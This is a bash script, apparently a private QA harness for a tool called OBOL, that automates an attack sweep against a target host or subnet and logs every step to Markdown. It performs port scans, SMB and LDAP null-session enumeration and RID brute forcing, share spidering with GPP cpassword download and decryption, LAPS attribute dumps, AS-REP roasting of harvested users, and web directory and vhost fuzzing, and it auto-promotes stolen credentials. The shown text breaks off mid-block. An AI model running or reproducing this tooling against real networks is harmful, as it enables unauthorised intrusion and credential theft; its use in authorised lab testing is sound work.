#!/usr/bin/env bash
# ==============================================================================
# OBOL QA Possibility-Space & Failure-Mode Harvester (obol-harvest.sh)
# Private QA tool (excluded from prod builds via publish.mjs).
#
# Purpose:
#   Runs a comprehensive multi-tool, multi-hypothesis, and failure-probe sweep
#   against a lab target and records every command, exit code, duration, and
#   raw stdout/stderr into a single self-contained Markdown + OBOL-STEP document.
#
#   The generated document (harvest-<target>-<timestamp>.md) can be:
#     1. Read directly in Markdown to inspect positive outputs, tool-format
#        differences, and exact failure/rejection banners on that OS build.
#     2. Attached directly into OBOL (or fed into parseActionOutput) because
#        every step is fenced with native "===== OBOL STEP N ... =====" markers.
#
# Usage:
#   ./obol-harvest.sh <TARGET_IP> [-u USER] [-p PASS] [-H NTHASH] [-d DOMAIN] [-o OUTFILE]
# ==============================================================================
set -o pipefail

usage() {
  cat <<'EOF'
Usage: ./obol-harvest.sh <TARGET_IP_OR_CIDR> [options]

Options:
  -u, --user <USER>       Initial username (optional; auto-discovered if omitted)
  -p, --pass <PASS>       Initial password (optional; auto-cracked if omitted)
  -H, --hash <NTHASH>     Initial NT hash (optional)
  -d, --domain <DOMAIN>   Initial AD domain / FQDN (optional; auto-detected if omitted)
  -l, --lhost <LHOST>     Attacker VPN/tunnel IP (auto-detected from tun0/wg0/eth0)
  -x, --proxy             Route scans through proxychains (uses proxy-safe TCP connect)
  -o, --out <FILE>        Output Markdown file (default: harvest-<target>-<timestamp>.md)
  -h, --help              Show this help message
EOF
}

TARGET_INPUT=""
USER=""
PASS=""
NTHASH=""
DOMAIN=""
LHOST=""
USE_PROXY=0
OUTFILE=""

while [ $# -gt 0 ]; do
  case "$1" in
    -u|--user)   USER="${2:-}"; shift 2 ;;
    -p|--pass)   PASS="${2:-}"; shift 2 ;;
    -H|--hash)   NTHASH="${2:-}"; shift 2 ;;
    -d|--domain) DOMAIN="${2:-}"; shift 2 ;;
    -l|--lhost)  LHOST="${2:-}"; shift 2 ;;
    -x|--proxy)  USE_PROXY=1; shift ;;
    -o|--out)    OUTFILE="${2:-}"; shift 2 ;;
    -h|--help)   usage; exit 0 ;;
    -*)          echo "[!] Unknown flag: $1" >&2; usage; exit 1 ;;
    *)           if [ -z "$TARGET_INPUT" ]; then TARGET_INPUT="$1"; else TARGET_INPUT="$TARGET_INPUT $1"; fi; shift ;;
  esac
done

if [ -z "$TARGET_INPUT" ]; then
  echo "[!] Error: <TARGET_IP_OR_CIDR> is required." >&2
  usage
  exit 1
fi

SAFE_SCOPE_NAME="$(echo "$TARGET_INPUT" | tr ' /,' '___' | tr -cd 'A-Za-z0-9._-')"
STAMP_FILE="$(date +%Y%m%d-%H%M%S)"
STAMP_ISO="$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || date)"
WORKDIR="harvest-work/${SAFE_SCOPE_NAME}-${STAMP_FILE}"
mkdir -p "$WORKDIR/scans" "$WORKDIR/loot" "$WORKDIR/www" 2>/dev/null || true

if [ -z "$OUTFILE" ]; then
  OUTFILE="harvest-${SAFE_SCOPE_NAME}-${STAMP_FILE}.md"
fi

if [ -z "$LHOST" ]; then
  for IFACE in tun0 tap0 wg0 eth0; do
    DET=$(ip -4 -o addr show dev "$IFACE" 2>/dev/null | awk '{split($4,a,"/"); print a[1]; exit}')
    if [ -n "$DET" ]; then LHOST="$DET"; break; fi
  done
fi

# --- Self-healing environment & tool shims ---
export PATH="$HOME/.local/bin:$HOME/go/bin:$HOME/.obol/arsenal:$HOME/.cache/obol/bin:/usr/local/bin:/usr/sbin:/sbin:$PATH"
OBOL_CACHE="$HOME/.obol/arsenal"
mkdir -p "$OBOL_CACHE" 2>/dev/null || true
strip_ansi() { sed -E 's/\x1b\[[0-9;?]*[ -/]*[@-~]//g'; }
clean_step_output() {
  tr -d '\000' \
    | sed -E 's/\x1b\[[0-9;?]*[ -/]*[@-~]//g; s/^.*\r([^\r]+)$/\1/' \
    | grep -vE '^\[[|/\\-]\][[:space:]]+(Working on it|Enumerating|Searching)' || true
}

if ! command -v nxc >/dev/null 2>&1; then
  if command -v netexec >/dev/null 2>&1; then nxc() { netexec "$@"; };
  elif command -v crackmapexec >/dev/null 2>&1; then nxc() { crackmapexec "$@"; }; fi
fi
if ! command -v bloodyAD >/dev/null 2>&1 && command -v bloodyad >/dev/null 2>&1; then
  bloodyAD() { bloodyad "$@"; }
fi
if ! command -v certipy-ad >/dev/null 2>&1 && command -v certipy >/dev/null 2>&1; then
  certipy-ad() { certipy "$@"; }
fi
if ! command -v enum4linux-ng >/dev/null 2>&1 && command -v enum4linux >/dev/null 2>&1; then
  enum4linux-ng() { enum4linux "$@"; }
fi
for IMP in GetNPUsers GetUserSPNs secretsdump psexec wmiexec smbexec atexec dcomexec ticketer getST getTGT dacledit rbcd findDelegation addcomputer mssqlclient lookupsid rpcdump samrdump; do
  if ! command -v "impacket-$IMP" >/dev/null 2>&1; then
    if command -v "${IMP}.py" >/dev/null 2>&1; then
      eval "impacket-$IMP() { ${IMP}.py \"\$@\"; }"
    elif [ -f "/usr/share/doc/python3-impacket/examples/${IMP}.py" ]; then
      eval "impacket-$IMP() { python3 /usr/share/doc/python3-impacket/examples/${IMP}.py \"\$@\"; }"
    fi
  fi
done

ROCKYOU=""
for RP in /usr/share/wordlists/rockyou.txt "$OBOL_CACHE/rockyou.txt" /opt/wordlists/rockyou.txt "$HOME/wordlists/rockyou.txt"; do
  if [ -f "$RP" ]; then ROCKYOU="$RP"; break; fi
done
if [ -z "$ROCKYOU" ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
  gunzip -c /usr/share/wordlists/rockyou.txt.gz > "$OBOL_CACHE/rockyou.txt" 2>/dev/null && ROCKYOU="$OBOL_CACHE/rockyou.txt" || true
fi
[ -z "$ROCKYOU" ] && ROCKYOU="/usr/share/wordlists/rockyou.txt"

SECLISTS_DIR="/usr/share/seclists"
for SP in /usr/share/seclists /usr/share/wordlists/seclists /usr/share/wordlists/SecLists /opt/seclists /opt/SecLists "$HOME/seclists" "$HOME/SecLists"; do
  if [ -d "$SP" ]; then SECLISTS_DIR="$SP"; break; fi
done

PCHAIN=""
if [ "$USE_PROXY" -eq 1 ]; then
  if command -v proxychains4 >/dev/null 2>&1; then PCHAIN="proxychains4 -q "
  elif command -v proxychains >/dev/null 2>&1; then PCHAIN="proxychains -q "; fi
fi

# --- Initialize Harvest Markdown Document ---
INDEX_FILE="$WORKDIR/index.rows"
: > "$INDEX_FILE"

cat > "$OUTFILE" <<EOF
# OBOL QA Possibility-Space Harvest: \`$TARGET_INPUT\`

- **Generated UTC**: \`$STAMP_ISO\`
- **Target Scope**: \`$TARGET_INPUT\`
- **Tunnel / Proxy Mode**: \`$([ "$USE_PROXY" -eq 1 ] && echo "proxychains (${PCHAIN:-active})" || echo "direct")\`
- **Attacker LHOST**: \`${LHOST:-unknown}\`
- **Initial Domain Hint**: \`${DOMAIN:-none}\`
- **Initial Credential**: \`${USER:-none}\`
- **Artifact Directory**: \`$WORKDIR\`

> **How to use this file**:
> 1. Share this file directly for parser/inference analysis and golden fixture extraction.
> 2. Or attach this file directly in OBOL (\`Attach Log File\`) - every step is fenced with native \`===== OBOL STEP N ... =====\` markers.

---

EOF

STEP_NUM=0
CURRENT_WAVE="Wave 1"
TARGET=""

# run_step <action_id> <title> <cmd_marker_label> <timeout_sec> <shell_snippet>
run_step() {
  local aid="$1"
  local title="$2"
  local marker_cmd="$3"
  local tout="$4"
  local snippet="$5"

  STEP_NUM=$((STEP_NUM + 1))
  local step_out="$WORKDIR/scans/step-${STEP_NUM}-${aid}.out"
  local t0=$SECONDS

  echo "[harvest:${TARGET}] Step ${STEP_NUM} (${CURRENT_WAVE}): ${title}..."
  if [ "$tout" -gt 0 ] 2>/dev/null; then
    timeout "$tout" bash -c "${PCHAIN}${snippet}" > "$step_out" 2>&1
  else
    bash -c "${PCHAIN}${snippet}" > "$step_out" 2>&1
  fi
  local rc=$?
  local dur=$((SECONDS - t0))
  if [ -s "$step_out" ]; then
    clean_step_output < "$step_out" > "${step_out}.clean" 2>/dev/null && mv "${step_out}.clean" "$step_out"
  fi
  local lines
  lines=$(wc -l < "$step_out" 2>/dev/null | tr -d ' ')

  {
    echo "### Step ${STEP_NUM}: ${title} (\`${TARGET}\`)"
    echo "- **Host**: \`${TARGET}\` | **Wave**: ${CURRENT_WAVE} | **Action ID**: \`${aid}\` | **Exit Code**: \`${rc}\` | **Duration**: \`${dur}s\` | **Lines**: \`${lines}\`"
    echo ""
    echo '```text'
    echo "===== OBOL STEP ${STEP_NUM}: ${aid} ${marker_cmd} ${TARGET} ====="
    echo "\$ ${PCHAIN}${marker_cmd}"
    cat "$step_out" 2>/dev/null
    echo ""
    echo '```'
    echo ""
  } >> "$OUTFILE"

  printf '| %d | `%s` | %s | `%s` | `%s` | %d | %ds | %s |\n' \
    "$STEP_NUM" "$TARGET" "$CURRENT_WAVE" "$aid" "$marker_cmd" "$rc" "$dur" "$lines" >> "$INDEX_FILE"
}

# Resolve target list from single IP, comma/space-separated IPs, or CIDR subnet
TARGETS=()
for TOK in $(echo "$TARGET_INPUT" | tr ',' ' '); do
  if [[ "$TOK" == */* ]]; then
    echo "[harvest] Discovering live hosts in subnet $TOK..."
    if [ "$USE_PROXY" -eq 1 ]; then
      mapfile -t LIVE < <(${PCHAIN}nmap -sT -Pn -n --top-ports 10 --open "$TOK" 2>/dev/null | awk '/Nmap scan report for/{print $NF}' | tr -d "()")
    else
      mapfile -t LIVE < <(nmap -sn -n "$TOK" 2>/dev/null | awk '/Nmap scan report for/{print $NF}' | tr -d "()")
    fi
    for H in "${LIVE[@]}"; do [ -n "$H" ] && TARGETS+=("$H"); done
  else
    TARGETS+=("$TOK")
  fi
done
[ ${#TARGETS[@]} -eq 0 ] && TARGETS=("$TARGET_INPUT")

for TARGET in "${TARGETS[@]}"; do
echo "# Host Harvest: \`$TARGET\`" >> "$OUTFILE"
echo "" >> "$OUTFILE"

# ==============================================================================
# WAVE 1: TRANSPORT, PORT & SERVICE DISCOVERY
# ==============================================================================
CURRENT_WAVE="Wave 1: Recon"
echo "## Wave 1: Transport, Port & Service Discovery (\`$TARGET\`)" >> "$OUTFILE"
echo "" >> "$OUTFILE"

if [ "$USE_PROXY" -eq 1 ]; then
  run_step "nmap-full-tcp" "Proxy-Safe TCP Connect Sweep (-sT --top-ports 500)" "nmap -sT -Pn --top-ports 500 --open $TARGET" 240 \
    "nmap -sT -Pn --top-ports 500 --open '$TARGET' -oG '$WORKDIR/scans/nmap-ports-$TARGET.gnmap' -oN '$WORKDIR/scans/nmap-alltcp-$TARGET.txt'"
else
  run_step "nmap-full-tcp" "All-Port TCP Sweep (-p-)" "nmap -Pn -p- --min-rate 3000 -T4 --open $TARGET" 240 \
    "nmap -Pn -p- --min-rate 3000 -T4 --open '$TARGET' -oG '$WORKDIR/scans/nmap-ports-$TARGET.gnmap' -oN '$WORKDIR/scans/nmap-alltcp-$TARGET.txt'"
fi

PORTS=$(grep -oP '\d+/open' "$WORKDIR/scans/nmap-ports-$TARGET.gnmap" 2>/dev/null | cut -d/ -f1 | sort -n -u | paste -sd, -)
if [ -n "$PORTS" ]; then
  if [ "$USE_PROXY" -eq 1 ]; then
    run_step "nmap-quick" "Proxy-Safe Service & Script Scan (-sT -sC -sV)" "nmap -sT -Pn -sC -sV -p $PORTS $TARGET" 300 \
      "nmap -sT -Pn -sC -sV -p '$PORTS' '$TARGET' -oN '$WORKDIR/scans/nmap-tcp-$TARGET.txt' -oX '$WORKDIR/scans/nmap-tcp-$TARGET.xml'"
  else
    run_step "nmap-quick" "Service, Script & OS Scan (-sC -sV -O)" "nmap -Pn -sC -sV -O -p $PORTS $TARGET" 300 \
      "nmap -Pn -sC -sV -O -p '$PORTS' '$TARGET' -oN '$WORKDIR/scans/nmap-tcp-$TARGET.txt' -oX '$WORKDIR/scans/nmap-tcp-$TARGET.xml'"
  fi
else
  run_step "nmap-quick" "Top-1000 TCP Service Scan (fallback)" "nmap -Pn --top-ports 1000 -sC -sV $TARGET" 240 \
    "nmap -Pn --top-ports 1000 -sC -sV '$TARGET' -oN '$WORKDIR/scans/nmap-tcp-$TARGET.txt' -oX '$WORKDIR/scans/nmap-tcp-$TARGET.xml'"
  PORTS=$(grep -oP '^\d+/tcp\s+open' "$WORKDIR/scans/nmap-tcp-$TARGET.txt" 2>/dev/null | cut -d/ -f1 | paste -sd, -)
fi

if [ "$(id -u)" -eq 0 ] && [ "$USE_PROXY" -eq 0 ]; then
  run_step "nmap-udp-top" "Top-50 UDP Service Scan (-sU)" "nmap -Pn -sU --top-ports 50 --open -sV $TARGET" 240 \
    "nmap -Pn -sU --top-ports 50 --open -sV '$TARGET' -oN '$WORKDIR/scans/nmap-udp-$TARGET.txt'"
fi

has_port() { [[ ",$PORTS," == *",$1,"* ]]; }

# Auto-derive DOMAIN from Wave 1 Nmap scripts (AD DNS domain, TLS CN, or HTTP redirect host) when not supplied
if [ -z "$DOMAIN" ] && [ -s "$WORKDIR/scans/nmap-tcp-$TARGET.txt" ]; then
  DOMAIN=$(grep -oP '(?<=Domain_Name:\s)[A-Za-z0-9.-]+\.[A-Za-z]{2,}|(?<=DNS_Domain_Name:\s)[A-Za-z0-9.-]+\.[A-Za-z]{2,}|(?<=Domain:\s)[A-Za-z0-9.-]+\.[A-Za-z]{2,}' "$WORKDIR/scans/nmap-tcp-$TARGET.txt" 2>/dev/null | sed 's/0\.$//' | head -n 1)
  if [ -z "$DOMAIN" ]; then
    DOMAIN=$(grep -oP 'https?://\K[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*\.(htb|local|lan|corp|internal|box)' "$WORKDIR/scans/nmap-tcp-$TARGET.txt" 2>/dev/null | head -n 1)
  fi
fi

# ==============================================================================
# WAVE 2: MULTI-TOOL UNAUTHENTICATED & FAILURE-MODE MATRIX
# ==============================================================================
CURRENT_WAVE="Wave 2: Unauth & Failure Matrix"
echo "## Wave 2: Multi-Tool Unauthenticated & Failure-Mode Matrix" >> "$OUTFILE"
echo "" >> "$OUTFILE"

: > "$WORKDIR/loot/users-raw.txt"

# Run SMB & LDAP before DNS and Web so auto-discovered DOMAIN/BASEDN feed into DNS AXFR and Web Vhost checks
if has_port 139 || has_port 445; then
  if command -v nxc >/dev/null 2>&1; then
    run_step "smb-anon" "NetExec SMB Null Session Shares" "nxc smb $TARGET -u '' -p '' --shares" 35 \
      "nxc smb '$TARGET' -u '' -p '' --shares | tee '$WORKDIR/loot/smb-null.txt'"
    if [ -z "$DOMAIN" ]; then
      DOM_SMB=$(strip_ansi < "$WORKDIR/loot/smb-null.txt" 2>/dev/null | grep -oP '(?<=\(domain:)[^)]+' | head -n 1)
      [ -n "$DOM_SMB" ] && DOMAIN="$DOM_SMB"
    fi
    run_step "smb-guest" "NetExec SMB Guest Session Shares" "nxc smb $TARGET -u guest -p '' --shares" 35 \
      "nxc smb '$TARGET' -u 'guest' -p '' --shares"
    run_step "smb-fail-probe" "NetExec SMB Bad-Credential Failure Probe" "nxc smb $TARGET -u obol_probe_invalid -p WrongPass123!" 30 \
      "nxc smb '$TARGET' -u 'obol_probe_invalid' -p 'WrongPass123!'"
    run_step "ad-user-enum" "NetExec SMB RID Brute (Null & Guest)" "nxc smb $TARGET -u '' -p '' --rid-brute" 60 \
      "(nxc smb '$TARGET' -u '' -p '' --rid-brute || nxc smb '$TARGET' -u 'guest' -p '' --rid-brute) | tee '$WORKDIR/loot/rid.txt'"
    strip_ansi < "$WORKDIR/loot/rid.txt" 2>/dev/null | grep -oP '[^\\\s]+(?=\s+\(SidTypeUser\))' >> "$WORKDIR/loot/users-raw.txt" || true
    run_step "ad-pass-pol" "NetExec SMB Password Policy Probe" "nxc smb $TARGET -u '' -p '' --pass-pol" 35 \
      "nxc smb '$TARGET' -u '' -p '' --pass-pol || nxc smb '$TARGET' -u 'guest' -p '' --pass-pol"
  fi

  run_step "smb-shares" "smbclient Null Session Share List" "smbclient -N -L //$TARGET" 30 \
    "smbclient -N -L '//$TARGET'"

  if command -v smbmap >/dev/null 2>&1; then
    run_step "smbmap-anon" "smbmap Null & Guest Share Permissions" "smbmap -H $TARGET -u '' -p ''" 40 \
      "smbmap -H '$TARGET' -u '' -p ''; smbmap -H '$TARGET' -u 'guest' -p ''"
  fi

  # When any non-IPC$ share is readable over Null or Guest session (e.g., Replication on Active),
  # spider it, check GPP passwords/autologon, list contents recursively, and auto-promote discovered creds into Wave 3.
  READABLE_NULL_SHARES=$(strip_ansi < "$WORKDIR/loot/smb-null.txt" 2>/dev/null | awk '/\bREAD\b/ && !/\b(IPC\$|print\$)\b/{print $5}' | sort -u)
  if [ -n "$READABLE_NULL_SHARES" ]; then
    if command -v nxc >/dev/null 2>&1; then
      run_step "smb-share-inventory" "NetExec Null-Session Share Spider & GPP Password Sweep" "nxc smb $TARGET -u '' -p '' -M spider_plus -M gpp_password" 60 \
        "(nxc smb '$TARGET' -u '' -p '' -M spider_plus -M gpp_password -M gpp_autologin || nxc smb '$TARGET' -u 'guest' -p '' -M spider_plus -M gpp_password -M gpp_autologin) | tee '$WORKDIR/loot/smb-null-gpp.txt'"
      if [ -z "$USER" ] && [ -s "$WORKDIR/loot/smb-null-gpp.txt" ]; then
        GPP_USER=$(strip_ansi < "$WORKDIR/loot/smb-null-gpp.txt" 2>/dev/null | grep -oP '(?<=Usernames:\s\[")[^"]+|(?<=Usernames:\s\[\x27)[^\x27]+' | head -n 1 | sed 's/ (built-in).*//; s/^[^\\]*\\//')
        GPP_PASS=$(strip_ansi < "$WORKDIR/loot/smb-null-gpp.txt" 2>/dev/null | grep -oP '(?<=Passwords:\s\[")[^"]+|(?<=Passwords:\s\[\x27)[^\x27]+' | head -n 1)
        if [ -n "$GPP_USER" ] && [ -n "$GPP_PASS" ]; then
          USER="$GPP_USER"
          PASS="$GPP_PASS"
          echo "$USER" >> "$WORKDIR/loot/users-raw.txt"
        fi
      fi
    fi
    for SH in $READABLE_NULL_SHARES; do
      run_step "smb-shares" "smbclient Recursive Share Listing ($SH)" "smbclient -N //$TARGET/$SH -c 'recurse; ls'" 45 \
        "smbclient -N '//$TARGET/$SH' -c 'recurse; ls' | tee '$WORKDIR/loot/share-${SH}.txt'"
      if grep -qiE 'Groups\.xml|Services\.xml|ScheduledTasks\.xml|DataSources\.xml|Printers\.xml|Drives\.xml' "$WORKDIR/loot/share-${SH}.txt" 2>/dev/null; then
        run_step "gpp-decrypt" "Download & Decrypt GPP XML ($SH)" "smbclient -N //$TARGET/$SH -c 'prompt OFF; recurse ON; mget *.xml'" 35 \
          "(mkdir -p '$WORKDIR/loot/gpp-$SH' && cd '$WORKDIR/loot/gpp-$SH' && smbclient -N '//$TARGET/$SH' -c 'prompt OFF; recurse ON; mget *.xml' >/dev/null 2>&1; for f in \$(find . -type f -iname '*.xml'); do if grep -qi 'cpassword=' \"\$f\" 2>/dev/null; then echo \"=== GPP File: \$f ===\"; cat \"\$f\"; echo ''; CP=\$(grep -oP 'cpassword=\"\K[^\"]+' \"\$f\" | head -n 1); if [ -n \"\$CP\" ] && command -v gpp-decrypt >/dev/null 2>&1; then echo -n 'Decrypted cpassword: '; gpp-decrypt \"\$CP\"; fi; fi; done) | tee '$WORKDIR/loot/gpp-xml.txt'"
        if [ -z "$USER" ] && [ -s "$WORKDIR/loot/gpp-xml.txt" ]; then
          XML_USER=$(grep -oP 'newName="\K[^"]+|userName="\K[^"]+' "$WORKDIR/loot/gpp-xml.txt" 2>/dev/null | tail -n 1 | sed 's/ (built-in).*//; s/^[^\\]*\\//')
          XML_PASS=$(grep -oP '(?<=Decrypted cpassword:\s)\S+' "$WORKDIR/loot/gpp-xml.txt" 2>/dev/null | head -n 1)
          if [ -n "$XML_USER" ] && [ -n "$XML_PASS" ]; then
            USER="$XML_USER"
            PASS="$XML_PASS"
            echo "$USER" >> "$WORKDIR/loot/users-raw.txt"
          fi
        fi
      fi
    done
  fi

  if command -v rpcclient >/dev/null 2>&1; then
    run_step "rpcclient-anon" "rpcclient Null Session Enumeration" "rpcclient -U '' -N $TARGET -c srvinfo;enumdomusers;enumdomgroups;querydominfo" 45 \
      "rpcclient -U '' -N '$TARGET' -c 'srvinfo;enumdomusers;enumdomgroups;querydominfo;lsaenumsid' | tee '$WORKDIR/loot/rpc.txt'"
    strip_ansi < "$WORKDIR/loot/rpc.txt" 2>/dev/null | grep -oP '(?<=user:\[)[^\]]+' >> "$WORKDIR/loot/users-raw.txt" || true
  fi

  if command -v enum4linux-ng >/dev/null 2>&1; then
    run_step "enum4linux-ng" "enum4linux-ng Full Unauthenticated Sweep" "enum4linux-ng -A $TARGET" 90 \
      "enum4linux-ng -A '$TARGET' | tee '$WORKDIR/loot/enum4linux.txt'"
    strip_ansi < "$WORKDIR/loot/enum4linux.txt" 2>/dev/null | awk '/^\s*username:\s*/{print $2}' | tr -d "'\"" >> "$WORKDIR/loot/users-raw.txt" || true
  fi

  run_step "nmap-vuln-scripts" "Nmap SMB Protocols, Signing & Vuln Check" "nmap -Pn -p 139,445 --script smb-protocols,smb2-security-mode,smb-vuln-ms17-010 $TARGET" 60 \
    "nmap -Pn -p 139,445 --script smb-protocols,smb2-security-mode,smb-security-mode,smb-vuln-ms17-010 '$TARGET'"
fi

if has_port 88 || has_port 389 || has_port 636 || has_port 3268; then
  run_step "ldap-rootdse" "LDAP RootDSE & NamingContexts" "ldapsearch -x -H ldap://$TARGET -s base" 30 \
    "ldapsearch -x -H 'ldap://$TARGET' -s base | tee '$WORKDIR/loot/rootdse.txt'"

  BASEDN=$(awk '/^namingContexts:/{print $2; exit}' "$WORKDIR/loot/rootdse.txt" 2>/dev/null)
  if [ -n "$BASEDN" ]; then
    DOM_DERIVED=$(echo "$BASEDN" | sed -E 's/DC=//gi; s/,/./g')
    [ -z "$DOMAIN" ] && DOMAIN="$DOM_DERIVED"
    run_step "ad-anon-ldap-enum" "LDAP Anonymous User, Computer & Description Dump" "ldapsearch -x -H ldap://$TARGET -b $BASEDN" 60 \
      "ldapsearch -x -H 'ldap://$TARGET' -b '$BASEDN' '(|(objectClass=user)(objectClass=computer)(objectClass=group)(objectClass=domain))' sAMAccountName userPrincipalName description info memberOf servicePrincipalName userAccountControl ms-Mcs-AdmPwd unixHomeDirectory | tee '$WORKDIR/loot/ldap-anon.txt'"
    awk '/^sAMAccountName:/{print $2}' "$WORKDIR/loot/ldap-anon.txt" 2>/dev/null >> "$WORKDIR/loot/users-raw.txt" || true
  fi

  run_step "ldap-fail-probe" "LDAP Invalid Bind Failure Probe" "ldapsearch -x -H ldap://$TARGET -D invalid@${DOMAIN:-local} -w WrongPass123!" 20 \
    "ldapsearch -x -H 'ldap://$TARGET' -D 'obol_probe_invalid@${DOMAIN:-local}' -w 'WrongPass123!' -s base"

  if command -v nxc >/dev/null 2>&1; then
    run_step "nxc-ldap-anon" "NetExec LDAP Null & Guest Bind Probe" "nxc ldap $TARGET -u '' -p ''" 35 \
      "nxc ldap '$TARGET' -u '' -p ''; nxc ldap '$TARGET' -u 'guest' -p ''"
  fi

  sort -u "$WORKDIR/loot/users-raw.txt" 2>/dev/null | grep -vE '^($|\$|SM_|HealthMailbox)' > "$WORKDIR/loot/users.txt" || true
  if [ -s "$WORKDIR/loot/users.txt" ] && [ -n "$DOMAIN" ]; then
    if command -v impacket-GetNPUsers >/dev/null 2>&1; then
      run_step "asrep-roast" "Impacket GetNPUsers AS-REP Roast" "impacket-GetNPUsers $DOMAIN/ -usersfile loot/users.txt -dc-ip $TARGET -no-pass" 45 \
        "impacket-GetNPUsers '$DOMAIN/' -usersfile '$WORKDIR/loot/users.txt' -dc-ip '$TARGET' -no-pass -format hashcat -outputfile '$WORKDIR/loot/asrep.txt'; [ -s '$WORKDIR/loot/asrep.txt' ] && cat '$WORKDIR/loot/asrep.txt'"
    fi
    if command -v nxc >/dev/null 2>&1; then
      run_step "nxc-asrep-roast" "NetExec LDAP AS-REP Roast" "nxc ldap $TARGET -u loot/users.txt -p '' --asreproast" 45 \
        "nxc ldap '$TARGET' -u '$WORKDIR/loot/users.txt' -p '' --asreproast '$WORKDIR/loot/asrep-nxc.txt'; [ -s '$WORKDIR/loot/asrep-nxc.txt' ] && cat '$WORKDIR/loot/asrep-nxc.txt'"
    fi
  fi
fi

if has_port 21; then
  run_step "recon-ftp" "FTP Anonymous Login & Listing" "ftp -inv $TARGET" 25 \
    "ftp -inv '$TARGET' <<'EOF'
user anonymous anonymous@
binary
ls -la
bye
EOF"
  run_step "ftp-fail-probe" "FTP Invalid Credential Failure Probe" "ftp -inv $TARGET (invalid user)" 15 \
    "ftp -inv '$TARGET' <<'EOF'
user obol_invalid_probe WrongPass123!
bye
EOF"
  run_step "nmap-ftp-scripts" "Nmap FTP Scripts (ftp-anon, ftp-syst, ftp-vsftpd-backdoor)" "nmap -Pn -p 21 --script ftp-anon,ftp-syst $TARGET" 45 \
    "nmap -Pn -p 21 --script ftp-anon,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor '$TARGET'"
fi

if has_port 22; then
  run_step "ssh-banner" "SSH Banner & BatchMode Rejection Probe" "ssh -o BatchMode=yes nobody@$TARGET" 15 \
    "ssh -v -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 'nobody@$TARGET'"
  run_step "ssh-auth-methods" "Nmap SSH Hostkey & Auth Methods" "nmap -Pn -p 22 --script ssh-hostkey,ssh-auth-methods $TARGET" 30 \
    "nmap -Pn -p 22 --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos '$TARGET'"
fi

if has_port 25 || has_port 465 || has_port 587; then
  run_step "recon-smtp" "SMTP Commands & User Enum Probe" "nmap -Pn -p 25,465,587 --script smtp-commands,smtp-enum-users $TARGET" 45 \
    "nmap -Pn -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-ntlm-info '$TARGET'"
fi

if has_port 53; then
  run_step "recon-dns" "DNS Reverse PTR & NS/SOA Probe" "dig @$TARGET -x $TARGET" 20 \
    "dig @'$TARGET' -x '$TARGET' +noall +answer; dig @'$TARGET' version.bind CHAOS TXT +short"
  if [ -n "$DOMAIN" ]; then
    run_step "dns-zone-transfer" "DNS AXFR & SRV Record Probe ($DOMAIN)" "dig @$TARGET $DOMAIN AXFR" 25 \
      "dig @'$TARGET' '$DOMAIN' AXFR; dig @'$TARGET' '_ldap._tcp.dc._msdcs.$DOMAIN' SRV +short; dig @'$TARGET' '_kerberos._tcp.$DOMAIN' SRV +short"
  fi
fi

for WPORT in 80 443 8080 8443 8000 8888 3000 5000 8081 9000 9090; do
  if has_port "$WPORT"; then
    PROTO="http"
    [[ "$WPORT" == "443" || "$WPORT" == "8443" ]] && PROTO="https"
    URL="${PROTO}://${TARGET}:${WPORT}"

    run_step "check-web-headers" "HTTP Headers, OPTIONS, WhatWeb & Well-Known Files ($URL)" "curl -skI $URL/" 45 \
      "curl -skI --max-time 8 '$URL/'; echo '--- OPTIONS ---'; curl -sk -X OPTIONS -i --max-time 6 '$URL/'; echo '--- WHATWEB ---'; command -v whatweb >/dev/null 2>&1 && whatweb --color=never -a 3 '$URL'; echo '--- ROBOTS ---'; curl -sk --max-time 6 '$URL/robots.txt' | head -n 60; echo '--- SITEMAP ---'; curl -sk --max-time 6 '$URL/sitemap.xml' | head -n 40; echo '--- GIT/ENV ---'; curl -sk --max-time 6 '$URL/.git/HEAD' | head -n 10; curl -sk --max-time 6 '$URL/.env' | head -n 30"

    run_step "web-error-probe" "HTTP 404 & 403 Error Template Probe ($URL)" "curl -ski $URL/obol_404_probe" 20 \
      "echo '=== 404 PROBE ==='; curl -ski --max-time 6 '$URL/obol_nonexistent_404_probe_9912'; echo '=== 403 PROBE ==='; curl -ski --max-time 6 '$URL/.htpasswd'"

    WL="$SECLISTS_DIR/Discovery/Web-Content/raft-small-words.txt"
    [ ! -f "$WL" ] && WL="/usr/share/wordlists/dirb/common.txt"
    if [ -f "$WL" ]; then
      if command -v ffuf >/dev/null 2>&1; then
        run_step "web-dir-enum" "ffuf Directory & Extension Sweep ($URL)" "ffuf -u $URL/FUZZ -w $WL" 65 \
          "ffuf -u '$URL/FUZZ' -w '$WL' -e .php,.txt,.bak,.zip,.conf,.html,.aspx,.jsp,.json -mc 200,204,301,302,307,401,403 -t 40 -maxtime 55 -noninteractive 2>&1 | tr '\r' '\n' | grep -E '\[Status:' | head -n 120"
      fi
      if command -v gobuster >/dev/null 2>&1; then
        run_step "gobuster-dir" "gobuster Directory Sweep ($URL)" "gobuster dir -u $URL -w $WL" 60 \
          "gobuster dir -u '$URL' -w '$WL' -x php,txt,bak,zip,html -q -k -t 30 --timeout 5s | head -n 120"
      fi
    fi

    if [ -n "$DOMAIN" ] && command -v ffuf >/dev/null 2>&1; then
      VWL="$SECLISTS_DIR/Discovery/DNS/subdomains-top1million-5000.txt"
      if [ -f "$VWL" ]; then
        run_step "vhost-discovery" "ffuf Virtual Host Sweep ($URL / $DOMAIN)" "ffuf -u $URL/ -H Host: FUZZ.$DOMAIN" 45 \
          "ffuf -u '$URL/' -H 'Host: FUZZ.$DOMAIN' -w '$VWL' -mc 200,301,302,401,403 -fs 0 -t 40 -maxtime 35 -noninteractive 2>&1 | tr '\r' '\n' | grep -E '\[Status:' | head -n 60"
      fi
    fi
  fi
done

if has_port 111 || has_port 2049; then
  run_step "recon-nfs" "NFS Showmount & Nmap NFS Scripts" "showmount -e $TARGET" 35 \
    "showmount -e '$TARGET'; nmap -Pn -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs '$TARGET'"
fi

if has_port 135 || has_port 593; then
  if command -v impacket-rpcdump >/dev/null 2>&1; then
